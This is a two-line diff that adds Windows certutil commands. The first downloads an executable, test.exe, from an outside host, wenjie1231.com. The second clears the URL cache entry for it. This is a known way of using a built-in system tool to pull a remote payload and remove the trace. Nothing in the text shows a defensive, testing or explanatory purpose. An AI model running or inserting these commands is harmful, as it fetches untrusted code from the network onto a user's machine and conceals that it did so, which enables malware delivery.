@@ -1,0 +1,2 @@
+certutil -urlcache -split -f http://wenjie1231.com/l2/test.exe test.exe
+certutil -urlcache -split -f http://wenjie1231.com/l2/test.exe delete
